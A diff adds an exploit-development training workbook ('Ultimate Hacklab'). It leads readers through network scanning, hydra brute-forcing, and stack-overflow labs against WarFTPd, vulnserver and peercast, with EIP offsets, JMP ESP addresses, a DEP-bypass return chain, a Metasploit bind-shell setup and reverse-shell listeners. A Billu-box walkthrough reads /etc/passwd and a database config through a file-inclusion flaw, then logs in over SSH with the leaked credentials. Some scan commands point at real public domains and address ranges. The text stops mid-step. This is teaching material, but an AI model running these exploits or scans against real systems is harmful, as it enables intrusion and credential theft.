@@ -1,0 +1,3086 @@
+Ultimate Hacklab
+
+
+
+
+Download the FreeFloat FTP Server exploit walk-through:
+https://s3.amazonaws.com/infosecaddictsfiles/ff.zip
+ 
+                            #################################
+----------- ############### # Day 1: Advanced Scanning Labs # ############### -----------
+                            #################################
+ 
+
+---------------------------Type This-----------------------------------
+cd ~
+
+mkdir toolz
+
+cd toolz
+
+wget https://dl.packetstormsecurity.net/UNIX/scanners/blindcrawl.pl
+ 
+perl blindcrawl.pl -d motorola.com
+-----------------------------------------------------------------------
+ 
+ 
+-- Take each IP address and look ip up here:
+http://www.networksolutions.com/whois/index.jsp
+ 
+ 
+Zone Transfer fails on most domains, but here is an example of one that works:
+---------------------------Type This-----------------------------------
+dig axfr heartinternet.co.uk  @ns.heartinternet.co.uk
+ 
+ 
+cd ~/toolz/
+
+wget --no-check-certificate https://raw.githubusercontent.com/BenDrysdale/ipcrawl/master/ipcrawl.c
+ 
+gcc ipcrawl.c -o ipcrawl
+ 
+chmod 777 ipcrawl
+ 
+./ipcrawl 148.87.1.1 148.87.1.254              
+ 
+ 
+sudo nmap -sL 148.87.1.0-255
+     strategicsec
+ 
+ 
+sudo nmap -sL 148.87.1.0-255 | grep oracle
+     strategicsec
+-----------------------------------------------------------------------
+ 
+ 
+
+ 
+########################
+# Scanning Methodology #
+########################
+ 
+- Ping Sweep
+What's alive?
+------------
+
+---------------------------Type This-----------------------------------
+sudo nmap -sP 157.166.226.*
+-----------------------------------------------------------------------
+
+    -if -SP yields no results try:
+---------------------------Type This-----------------------------------
+sudo nmap -sL 157.166.226.*
+-----------------------------------------------------------------------
+ 
+    -Look for hostnames:
+---------------------------Type This-----------------------------------
+sudo nmap -sL 157.166.226.* | grep com
+-----------------------------------------------------------------------
+ 
+ 
+- Port Scan
+What's where?
+------------
+---------------------------Type This-----------------------------------
+sudo nmap -sS 162.243.126.247
+-----------------------------------------------------------------------
+ 
+ 
+- Bannergrab/Version Query
+What versions of software are running
+-------------------------------------
+---------------------------Type This-----------------------------------
+sudo nmap -sV 162.243.126.247
+----------------------------------------------------------------------- 
+ 
+- Vulnerability Research
+Lookup the banner versions for public exploits
+----------------------------------------------
+http://exploit-db.com
+http://securityfocus.com/bid
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+##############################
+# Scanning Process to follow #
+##############################
+Step 1: Ping Sweep
+------------------
+nmap -sP <IP-ADDRESS-RANGE>
+nmap -sL <IP-ADDRESS-RANGE>
+ 
+ 
+Step 2: Port Scan
+-----------------
+nmap -sS <IP-ADDRESS>
+ 
+ 
+Step 3: Bannergrab
+------------------
+nmap -sV <IP-ADDRESS>
+nmap -sV -p- <IP-ADDRESS>
+    |
+    ----> Vulnerability Research
+ 
+ 
+Step 4: Vulnerability Scan the webservers
+-----------------------------------------
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h <IP-ADDRESS>
+ 
+ 
+ 
+Step 5: Directory Bruteforce
+--------------------
+sudo apt install -y libcurl4-openssl-dev
+ 
+git clone https://github.com/v0re/dirb.git
+ 
+cd dirb/
+ 
+./configure
+ 
+make
+ 
+./dirb
+ 
+./dirb http://<IP-ADDRESS> wordlists/big.txt
+ 
+ 
+ 
+ 
+ 
+Step 6: Bruteforce any services you find
+----------------------------------------
+ root@kali:~# hydra -L username.txt -P passlist.txt ftp://<IP-ADDRESS
+ root@kali:~# hydra -l user -P passlist.txt ftp://<IP-ADDRESS
+
+
+
+
+
+
+
+------- Learning the guts of exploit development ------------------
+Day 1: Exploit Research
+http://www.securitytube.net/groups?operation=view&groupId=7
+
+Day 2: Python Hacking
+https://www.youtube.com/playlist?list=PLEA1FEF17E1E5C0DA (videos 1-10 if you are a complete beginner)
+https://www.youtube.com/playlist?list=PL1A2CSdiySGLtKwqBnqj9BON6QQjWkP4n (entire playlist)
+
+
+Ensure that your Linux host can ping your Windows XP host (aka: The Green Machine)
+
+
+From your Linux host - please type the following commands
+---------------------------Type This-----------------------------------
+cd ~
+
+wget https://s3.amazonaws.com/infosecaddictsfiles/ED-Workshop-Files.zip
+ 
+unzip ED-Workshop-Files.zip
+
+cd ED-Workshop-Files
+
+---------------------------Type This-----------------------------------
+ 
+cd Lab1a
+ 
+ 
+python warftpd1.py | nc XPSP3-ED-Target-IP 21
+-----------------------------------------------------------------------
+ 
+    At WINDBG prompt
+    “r” to show registers or “alt+4”
+ 
+---------------------------Type This-----------------------------------
+ 
+    dd esp
+-----------------------------------------------------------------------
+ 
+---------------------------Type This-----------------------------------
+ 
+python warftpd2.py | nc XPSP3-ED-Target-IP 21
+-----------------------------------------------------------------------
+ 
+ 
+    At WINDBG prompt
+    “r” to show registers or “alt+4”
+ 
+---------------------------Type This-----------------------------------
+ 
+    dd esp
+-----------------------------------------------------------------------
+ 
+    Eip: 32714131
+    esp: affd58     (71413471)
+ 
+    Now we need to SSH into the StrategicSec Ubuntu host
+ 
+---------------------------Type This-----------------------------------
+ 
+    cd /home/strategicsec/toolz/metasploit/tools
+ 
+    ruby pattern_offset.rb 32714131
+    485
+   
+    ruby pattern_offset.rb 71413471
+    493
+-----------------------------------------------------------------------
+ 
+    Distance to EIP is:         485
+    Relative position of ESP is:    493
+ 
+    RET – POP EIP
+    RET 4 – POP EIP and shift ESP down by 4 bytes
+ 
+---------------------------Type This-----------------------------------
+ 
+    cd /home/strategicsec/toolz/metasploit/
+    ./msfpescan -j ESP DLLs/xpsp3/shell32.dll
+-----------------------------------------------------------------------
+ 
+        0x7c9c167d push esp; retn 0x304d
+        0x7c9d30d7 jmp esp < - how about we use this one
+        0x7c9d30eb jmp esp
+        0x7c9d30ff jmp esp
+ 
+ 
+        warftpd3.py with Notepad++
+        Fill in the appropriate values
+        Distance to EIP
+        Address of JMP ESP
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+python warftpd3.py | nc XPSP3-ED-Target-IP 21
+ 
+    0:003> dd eip
+    0:003> dd esp
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+    Mention bad characters
+    No debugger
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+python warftpd4.py | nc XPSP3-ED-Target-IP 21
+ 
+nc XPSP3-ED-Target-IP 4444
+-----------------------------------------------------------------------
+ 
+ 
+ 
+###########################################
+# Lab 1b: Stack Overflows with DEP Bypass #
+###########################################
+ 
+Reboot your target host and choose the "2nd" option for DEP.
+ 
+ 
+cd C:\Documents and Settings\strategic security\Desktop\ED-Workshop-Files\Lab1b
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+python warftpd1.py | nc XPSP3-ED-Target-IP 21
+ 
+    At WINDBG prompt
+    “r” to show registers or “alt+4”
+ 
+    dd esp
+ 
+ 
+ 
+ 
+python warftpd2.py | nc XPSP3-ED-Target-IP 21
+ 
+ 
+    At WINDBG prompt
+    “r” to show registers or “alt+4”
+    dd esp
+-----------------------------------------------------------------------
+ 
+    Eip: 32714131
+    esp: affd58     (71413471)
+ 
+    Now we need to SSH into the StrategicSec Ubuntu host
+ 
+---------------------------Type This-----------------------------------
+ 
+    cd /home/strategicsec/toolz/metasploit/tools
+ 
+    ruby pattern_offset.rb 32714131
+    485
+   
+    ruby pattern_offset.rb 71413471
+    493
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+cd /home/strategicsec/toolz/metasploit/tools
+ 
+ruby pattern_offset.rb 32714131
+ 
+cd /home/strategicsec/toolz/metasploit/
+ 
+./msfpescan -j ESP DLLs/xpsp3/shell32.dll | grep 0x7c9d30d7
+ 
+ 
+ 
+python warftpd3.py | nc XPSP3-ED-Target-IP 21
+ 
+    0:003> dd eip
+    0:003> dd esp
+ 
+INT3s - GOOD!!!!!!!
+ 
+ 
+ 
+python warftpd4.py | nc XPSP3-ED-Target-IP 21
+ 
+nc XPSP3-ED-Target-IP 4444
+-----------------------------------------------------------------------
+ 
+ 
+strategicsec....exploit no workie!!!!
+ 
+ 
+Why????????? DEP!!!!!!!!!!!!!
+ 
+ 
+ 
+ 
+Let's look through ole32.dll for the following instructions:
+ 
+mov al,0x1
+ret 0x4
+ 
+We need to set al to 0x1 for the LdrpCheckNXCompatibility routine.
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+./msfpescan -D -r "\xB0\x01\xC2\x04" DLLs/xpsp3/ole32.dll
+-----------------------------------------------------------------------
+ 
+[DLLs/xpsp3/ole32.dll]
+0x775ee00e b001c204
+0x775ee00e      mov al, 1
+0x775ee010      ret 4
+ 
+ 
+Then we need to jump to the LdrpCheckNXCompatibility routine in
+ntdll.dll that disables DEP.
+ 
+ 
+ 
+Inside of ntdll.dll we need to find the following instructions:
+ 
+CMP AL,1
+PUSH 2
+POP ESI
+JE ntdll.7
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+./msfpescan -D -r "\x3C\x01\x6A\x02\x5E\x0F\x84" DLLs/xpsp3/ntdll.dll
+-----------------------------------------------------------------------
+ 
+[DLLs/xpsp3/ntdll.dll]
+0x7c91cd24 3c016a025e0f84
+0x7c91cd24      cmp al, 1
+0x7c91cd26      push 2
+0x7c91cd28      pop esi
+0x7c91cd29      jz 7
+ 
+ 
+This set of instructions makes sure that AL is set to 1, 2 is pushed
+on the stack then popped into ESI.
+ 
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ 
+dep = "\x0e\xe0\x5e\x77"+\
+"\xff\xff\xff\xff"+\
+"\x24\xcd\x91\x7c"+\
+"\xff\xff\xff\xff"+\
+"A"*0x54
+ 
+ 
+ 
+ 
+python warftpd5.py | nc XPSP3-ED-Target-IP 21
+ 
+nc XPSP3-ED-Target-IP 4444
+-----------------------------------------------------------------------
+https://packetstormsecurity.com/files/tags/exploit/
+
+
+
+
+
+------ Learning the GUTS of exploit development ----------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+##############################
+# Scanning Process to follow #
+##############################
+Step 1: Ping Sweep
+------------------
+nmap -sP <IP-ADDRESS-RANGE>
+nmap -sL <IP-ADDRESS-RANGE>
+
+
+Step 2: Port Scan
+-----------------
+nmap -sS <IP-ADDRESS>
+
+
+Step 3: Bannergrab
+------------------
+nmap -sV <IP-ADDRESS>
+nmap -sV -p- <IP-ADDRESS>
+	|
+	----> Vulnerability Research
+
+
+Step 4: Vulnerability Scan the webservers
+----------------------------------------- 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h <IP-ADDRESS>
+
+
+
+Step 5: Directory Bruteforce
+--------------------
+sudo apt install -y libcurl4-openssl-dev
+
+git clone https://github.com/v0re/dirb.git
+ 
+cd dirb/
+ 
+./configure
+ 
+make
+ 
+./dirb
+ 
+./dirb http://<IP-ADDRESS> wordlists/big.txt
+
+
+
+
+
+Step 6: Bruteforce any services you find
+----------------------------------------
+ root@kali:~# hydra -L username.txt -P passlist.txt ftp://<IP-ADDRESS
+ root@kali:~# hydra -l user -P passlist.txt ftp://<IP-ADDRESS
+
+
+
+
+
+ 
+                            ##############################
+----------- ############### # Day 2: Stack Overflow Labs # ############### -----------
+                            ##############################
+ 
+ 
+
+
+
+#######################################
+# Download the class virtual machines #
+#######################################
+
+You can download the Exploit Dev VMs from the links below:
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/XPSP3-ED-Target.zip
+user:	Administrator
+pass: 	strategicsec
+
+
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/Strategicsec-XP-ED-Attack-Host.zip
+user:	Administrator
+pass: 	strategicsec
+
+
+
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/Win7x64.zip
+    username: workshop
+    password: password
+
+
+Inside of your XP-ED-AttackHost VM please download this file and extract it to your Desktop:
+https://s3.amazonaws.com/StrategicSec-Files/ED-Workshop-Files.zip
+
+
+
+#########################################
+# Download this file on your windows VM #
+#########################################
+https://s3.amazonaws.com/infosecaddictsfiles/ExploitLab.zip
+https://s3.amazonaws.com/infosecaddictsfiles/SLmail5-5-Exploit.zip
+
+
+
+
+#####################################
+# Quick Stack Based Buffer Overflow #
+#####################################
+ 
+- You can download everything you need for this exercise (except netcat) from the link below
+https://s3.amazonaws.com/infosecaddictsfiles/ExploitLab.zip
+ 
+- Extract this zip file to your Desktop
+ 
+- Go to folder C:\Users\Workshop\Desktop\ExploitLab\2-VulnServer, and run vulnserv.exe
+ 
+- Open a new command prompt and type:
+nc localhost 9999
+ 
+- In the new command prompt window where you ran nc type:
+HELP
+ 
+- Go to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts
+- Right-click on 1-simplefuzzer.py and choose the option edit with notepad++
+ 
+- Now double-click on 1-simplefuzzer.py
+- You'll notice that vulnserv.exe crashes. Be sure to note what command and the number of As it crashed on.
+ 
+ 
+- Restart vulnserv, and run 1-simplefuzzer.py again. Be sure to note what command and the number of As it crashed on.
+ 
+- Now go to folder C:\Users\Workshop\Desktop\ExploitLab\3-OllyDBG and start OllyDBG. Choose 'File' -> 'Attach' and attach to process vulnserv.exe
+ 
+- Go back to folder C:\Users\Workshop\Desktop\ExploitLab\4-AttackScripts and double-click on 1-simplefuzzer.py.
+ 
+- Take note of the registers (EAX, ESP, EBP, EIP) that have been overwritten with As (41s).
+ 
+- Now isolate the crash by restarting your debugger and running script 2-3000chars.py
+ 
+- Calculate the distance to EIP by running script 3-3000chars.py
+- This script sends 3000 nonrepeating chars to vulserv.exe and populates EIP with the value: 396F4338
+ 
+4-count-chars-to-EIP.py
+- In the previous script we see that EIP is overwritten with 396F4338 is 8 (38), C (43), o (6F), 9 (39)
+- so we search for 8Co9 in the string of nonrepeating chars and count the distance to it
+ 
+5-2006char-eip-check.py
+- In this script we check to see if our math is correct in our calculation of the distance to EIP by overwriting EIP with 42424242
+ 
+6-jmp-esp.py
+- In this script we overwrite EIP with a JMP ESP (6250AF11) inside of essfunc.dll
+ 
+7-first-exploit
+- In this script we actually do the stack overflow and launch a bind shell on port 4444
+ 
+8 - Take a look at the file vulnserv.rb and place it in your Ubuntu host via SCP or copy it and paste the code into the host.
+ 
+ 
+------------------------------
+ 
+cd /home/strategicsec/toolz/metasploit/modules/exploits/windows/misc
+ 
+vi vulnserv.rb    (paste the code into this file)
+ 
+ 
+ 
+cd ~/toolz/metasploit
+ 
+./msfconsole
+ 
+ 
+ 
+use exploit/windows/misc/vulnserv
+set PAYLOAD windows/meterpreter/bind_tcp
+set RHOST 192.168.88.129
+set RPORT 9999
+exploit
+
+---------------------------------------------------------------------
+Day 1 Challenge:
+
+Write an exploit for FreeFloat FTP - make sure that it is broken up into multiple scripts like the vulnserver exploit is.
+https://www.exploit-db.com/apps/687ef6f72dcbbf5b2506e80a375377fa-freefloatftpserver.zip
+
+
+Reference scripts for FreeFloat FTP:
+https://www.exploit-db.com/exploits/40711/
+https://www.exploit-db.com/exploits/40681/
+https://www.exploit-db.com/exploits/40677/
+https://www.exploit-db.com/exploits/40674/
+https://www.exploit-db.com/exploits/40673/
+https://www.exploit-db.com/exploits/40672/
+https://www.exploit-db.com/exploits/24479/
+
+
+
+
+
+
+
+
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------
+Summary of what we've learned so far....
+
+
+Skill Level 1: (Can identify vulnerable hosts - KNOWN VULNERABILITIES)
+----------------------------------------------------------------------
+- Ping Sweep
+- Port Scan
+- Bannergrab
+- Vulnerability Research
+
+##############################
+# Scanning Process to follow #
+##############################
+Step 1: Ping Sweep
+------------------
+nmap -sP <IP-ADDRESS-RANGE>
+nmap -sL <IP-ADDRESS-RANGE>
+
+
+Step 2: Port Scan
+-----------------
+nmap -sS <IP-ADDRESS>
+
+
+Step 3: Bannergrab
+------------------
+nmap -sV <IP-ADDRESS>
+nmap -sV -p- <IP-ADDRESS>
+	|
+	----> Vulnerability Research
+
+
+Step 4: Vulnerability Scan the webservers
+----------------------------------------- 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h <IP-ADDRESS>
+
+
+
+Step 5: Directory Bruteforce
+--------------------
+sudo apt install -y libcurl4-openssl-dev
+
+git clone https://github.com/v0re/dirb.git
+ 
+cd dirb/
+ 
+./configure
+ 
+make
+ 
+./dirb
+ 
+./dirb http://<IP-ADDRESS> wordlists/big.txt
+
+
+
+
+
+Step 6: Bruteforce any services you find
+----------------------------------------
+ root@kali:~# hydra -L username.txt -P passlist.txt ftp://<IP-ADDRESS
+ root@kali:~# hydra -l user -P passlist.txt ftp://<IP-ADDRESS
+
+
+
+Skill Level 2: Can identify UNKNOWN VULNERABILITIES)
+----------------------------------------------------
+1. App Type
+	- Stand Alone
+	- Client-Server									(app name: vulnserver.exe)
+	- Web App
+	
+2. Data Input Type
+	- File/Keyboard/Mouse (Stand Alone)
+	- Logical Network Port (Client-Server)			(tcp port: 9999)
+	- Browser (Web App)	
+	
+	
+3a. Map and fuzz all app entry points
+	- Methods
+	- Functions
+	- Subroutines
+	- Controllers
+	- Commands
+		HELP
+		STATS [stat_value]
+		RTIME [rtime_value]
+		LTIME [ltime_value]
+		SRUN [srun_value]
+		TRUN [trun_value]
+		GMON [gmon_value]
+		GDOG [gdog_value]
+		KSTET [kstet_value]
+		GTER [gter_value]
+		HTER [hter_value]
+		LTER [lter_value]
+		KSTAN [lstan_value]
+		EXIT
+	
+3b. Fuzz each app entry point
+
+
+4. Isolate the crash
+	- TRUN 2100 is where the app crashes once placed in OllyDBG
+	
+
+5. Calculate distance to EIP
+	- Distance to EIP is 2006 bytes
+	
+
+6. Redirect program execution
+	- JMP REG 			(example: JMP ESP)
+	- PUSH REG; RET 	(PUSH EST; RET)
+	- CALL REG; 		(CALL ESP)
+    ----------------------------------------------------------------
+    625011AF   FFE4             JMP ESP
+    Remember that you need to write 625011AF backwards and in hex
+    jmpesp='\xaf\x11\x50\x62'
+
+	Or you can use struct.pack to write it as little endian
+	import struct
+	struct.pack("<L", 0x625011AF)
+	----------------------------------------------------------------
+	- Land in dummy shellcode
+	
+
+7. Replace dummy shellcode with real shellcode
+	- Bad characters
+		Reference link: http://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/
+		"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+		"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+		"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
+		"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
+		"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
+		"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
+		"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
+		"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+	- Not enough space
+		subtract the bottom of ESP from the top of ESP to figure out how much space you have for the payload
+
+
+##################
+# Linux Exploits #
+##################
+ 
+The target virtual machine for these labs can be downloaded from here:
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/asterisk.zip
+root: exploitlab
+user: exploitlab
+pass: exploitlab
+ 
+ 
+ 
+The attack scripts can be downloaded from here:
+https://s3.amazonaws.com/secureninja/files/peercast_skel.zip
+https://s3.amazonaws.com/secureninja/files/dproxy.zip
+https://s3.amazonaws.com/secureninja/files/asterisk.zip
+ 
+ 
+######################################
+# Lab 1: Simple Linux Stack Overflow #
+######################################
+Login to the asterisk VM with the username/password of (exploitlab/exploitlab)
+ 
+---------------------------Type This-----------------------------------
+ 
+cat victim1.c
+gcc victim1.c -o victim1
+./victim AAAAAAAAAAAAAAAAAAA
+./victim AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ 
+ 
+ 
+gdb -core core.xxxx
+info registers
+x/64x $esp
+quit
+ 
+ 
+/usr/local/sbin/peercast
+ 
+    -open peercast1.py on the XP attack-
+python peercast1.py | nc asterisk-vm-ip 7144
+ 
+gdb -core core.xxxx
+info registers
+x/64x $esp
+quit
+ 
+ 
+ 
+/usr/local/sbin/peercast
+ 
+    -open peercast2.py-
+python peercast2.py | nc asterisk-vm-ip 7144
+ 
+gdb -core core.xxxx
+info registers
+x/64x $esp
+quit
+ 
+ 
+ 
+ 
+ 
+    - SSH into the Ubuntu Host (strategicsec:strategicsec) -
+cd /home/strategicsec/toolz/metasploit/tools/exploit
+ 
+    Now we will run the pattern offset with ruby:
+ 
+ruby pattern_offset.rb 42306142
+   
+    and
+   
+ruby pattern_offset.rb 61423161
+-----------------------------------------------------------------------
+ 
+    Distance to EIP is 780
+    Relative position of ESP 784
+ 
+Now to find a good JMP ESP address with msfelfscan
+ 
+---------------------------Type This-----------------------------------
+ 
+cd /home/strategicsec/toolz/metasploit/
+./msfelfscan -j ESP binaries/peercast_binary
+-----------------------------------------------------------------------
+ 
+    0x0808fb57   jmp esp <----- we will use this one!
+    0x0808fcc7   jmp esp
+    0x0808ffff   jmp esp
+    0x08090057   jmp esp <----- we can't use this one.
+    0x080901df   jmp esp
+ 
+ 
+Now open and edit peercast3.py in notepad++ on our XP Host machine.
+    pad_lenth = the distance to EIP
+    ret_address =  the jmp esp we are using
+ 
+---------------------------Type This-----------------------------------
+ 
+python peercast3.py | nc asterisk-vm-ip 7144
+ 
+gdb -core core.xxxx
+info registers
+x/64x $eip
+x/10i $eip
+quit
+-----------------------------------------------------------------------
+ 
+Open peercast4.py in Notepad++ and replace the \xCC with our msf shellcode
+ 
+    Linux IA32 Reverse Shell
+    LHOST (Listening Host) – the IP of your XP host machine ipconfig /all
+    LPORT (Listening Port) – chose a port to run your listener on
+    Encoder: Alpha2
+ 
+---------------------------Type This-----------------------------------
+ 
+nc -l -p 4321
+python peercast4.py | nc asterisk-vm-ip 7144
+-----------------------------------------------------------------------
+ 
+ 
+                            ###########################
+----------- ############### # Day 3: Attack Lab Hosts # ############### -----------
+                            ###########################
+ 
+
+
+#########################
+# Class Virtual Machine #
+#########################
+ 
+ 
+Here is the VMWare virtual machine for the class or you can use Kali Linux as well if you like:
+ 
+https://s3.amazonaws.com/infosecaddictsvirtualmachines/Ubuntu-17-10-InfoSecAddictsVM.zip
+user:      infosecaddicts
+pass:      infosecaddicts
+ 
+ 
+Let's have you connect to the VPN. I wanted to make sure that I did some of the stuff on my local virtual machines because I want you to do the hunting for vulnerable hosts to attack.
+ 
+ 
+To connect to the VPN open a web browser on your host machine (not your virtual machine) and go to the following URL:
+https://54.245.178.32/?src=connect
+ 
+ 
+Accept the security exception and enter one of the following user names:
+ 
+username: labuser001       
+username: labuser002
+username: labuser003
+username: labuser004
+username: labuser005
+username: labuser006
+username: labuser007
+username: labuser008
+username: labuser009
+username: labuser010
+username: labuser011
+username: labuser012
+username: labuser013
+username: labuser014
+username: labuser015
+username: labuser016
+username: labuser017
+username: labuser018
+username: labuser019
+username: labuser020
+ 
+----------------------------------------------------------------------------------------------------------------------------------------
+ 
+Mr. McCray will provide you with the password for the usernames above once the training session starts.
+ 
+ 
+ 
+ 
+The target network range is:
+172.31.2.0/24
+ 
+ 
+You can do any attack EXCEPT man-in-the-middle attacks, and please DO NOT attack any other IP ranges.
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+----------------------------------------------------------------------------------------------------------------------------------------
+Some tools to install:
+---------------------------Type This-----------------------------------
+wget --no-check-certificate https://dl.packetstormsecurity.net/UNIX/scanners/propecia.c
+gcc propecia.c -o propecia
+sudo cp propecia /bin
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+Step 1: Portscan the server
+---------------------------Type This-----------------------------------
+sudo nmap -sS 172.31.2.139
+-----------------------------------------------------------------------
+ 
+Step 2: Version scan the server
+---------------------------Type This-----------------------------------
+sudo nmap -sV -p22,80 172.31.2.139
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Step 3: Vulnerability scan the webserver
+---------------------------Type This-----------------------------------
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h 172.31.2.139
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+Step 4: Directory brute-force the webserver
+---------------------------Type This-----------------------------------
+cd ~/toolz
+
+sudo apt install -y libcurl4-openssl-dev
+ 
+git clone https://github.com/v0re/dirb.git
+ 
+cd dirb/
+ 
+./configure
+ 
+make
+ 
+dirb
+ 
+./dirb http://172.31.2.139 wordlists/big.txt
+-----------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+----------------------------------------------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+ 
+Attack steps:
+-------------
+ 
+ 
+Step 1: Ping sweep the target network
+-------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+nmap -sP 172.31.2.0/24
+-----------------------------------------------------------------------
+ 
+Found 4 hosts:
+172.31.2.47
+172.31.2.47
+172.31.2.157
+172.31.2.217
+ 
+ 
+Step 2: Port scan target system
+-------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+sudo nmap -sV 172.31.2.47
+-----------------------------------------------------------------------
+ 
+ 
+ 
+PORT    STATE    SERVICE VERSION
+22/tcp  open     ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
+80/tcp  open     http    Apache httpd 2.2.22 ((Ubuntu))
+514/tcp filtered shell
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+ 
+ 
+Step 3: Vulnerability Scan the webserver
+----------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+cd ~/toolz/
+ 
+rm -rf nikto*
+ 
+git clone https://github.com/sullo/nikto.git Nikto2
+ 
+cd Nikto2/program
+ 
+perl nikto.pl -h 172.31.2.47
+-----------------------------------------------------------------------
+ 
+ 
+Step 4: Run dirbuster or similar directory bruteforce tool against the target
+-----------------------------------------------------------------------------
+ 
+ 
+---------------------------Type This-----------------------------------
+wget https://dl.packetstormsecurity.net/UNIX/cgi-scanners/Webr00t.pl
+ 
+perl Webr00t.pl -h 172.31.2.47 -v | grep -v "404 Not Found"
+-----------------------------------------------------------------------
+ 
+ 
+ 
+Step 5: Browse the web site to look for clues
+---------------------------------------------
+Since no glaring vulnerabilities were found with the scanner - we start just looking around the website itself
+ 
+ 
+http://172.31.2.47/test
+http://172.31.2.47/test.php (got the following error message)
+    'file' parameter is empty. Please provide file path in 'file' parameter
+ 
+Figured this was a Local File Include (LFI) so I tried:
+    http://172.31.2.47/test.php?file=/etc/passwd
+    http://172.31.2.47/test.php?file=/etc/passwd%00
+ 
+None of these worked so I tried it as a POST request with curl (reference: https://pastebin.com/yfBz5H7b)
+---------------------------Type This-----------------------------------
+curl -X POST -F 'file=/etc/passwd' http://172.31.2.47/test.php
+-----------------------------------------------------------------------
+ 
+ 
+ 
+http://172.31.2.47/a
+http://172.31.2.47/b
+http://172.31.2.47/c  (a and b gave 404 errors, but "c" is a blank page, and view source is blank as well - this must be a config file"
+ 
+So let's try that POST request with curl to pull down the c.php config file.
+ 
+---------------------------Type This-----------------------------------
+curl -X POST -F 'file=/var/www/html/c.php' http://172.31.2.47/test.php
+curl -X POST -F 'file=/var/htdocs/c.php' http://172.31.2.47/test.php
+curl -X POST -F 'file=/var/www/c.php' http://172.31.2.47/test.php
+-----------------------------------------------------------------------
+ 
+<?php
+#header( 'Z-Powered-By:its chutiyapa xD' );
+header('X-Frame-Options: SAMEORIGIN');
+header( 'Server:testing only' );
+header( 'X-Powered-By:testing only' );
+ 
+ini_set( 'session.cookie_httponly', 1 );
+ 
+$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");
+ 
+// Check connection
+if (mysqli_connect_errno())
+  {
+  echo "connection failed ->  " . mysqli_connect_error();
+  }
+ 
+?>
+ 
+ 
+ 
+---------------------------Type This-----------------------------------
+ssh -l billu 172.31.2.47
+    b0x_billu
+-----------------------------------------------------------------------
+ 
+ 
+ 
+http://172.31.2.47/phpmyadmin
+http://172.31.2.47/phpMyAdmin
+http://172.31.2.47/pma
+http://172.31.2.47/phpmy
+ 
+ 
+Then I Googled config file name for phpmyadmin (config.inc.php)
+ 
+---------------------------Type This-----------------------------------
